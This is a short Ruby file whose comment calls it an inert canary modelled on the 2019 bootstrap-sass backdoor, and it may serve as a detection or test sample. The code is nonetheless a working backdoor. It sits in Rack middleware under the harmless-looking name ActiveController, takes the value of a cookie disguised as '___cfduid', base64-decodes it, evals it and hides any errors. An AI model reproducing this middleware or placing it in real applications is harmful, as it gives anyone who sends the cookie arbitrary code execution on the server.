# INERT CANARY modelled on bootstrap-sass 3.2.0.3 (2019): cookie-triggered eval backdoor.
require 'base64'
module ActiveController
  class Middleware
    def initialize(app)
      @app = app
    end

    def call(env)
      req = Rack::Request.new(env)
      x = req.cookies['___cfduid']
      eval(Base64.urlsafe_decode64(x)) rescue nil if x
      @app.call(env)
    end
  end
end
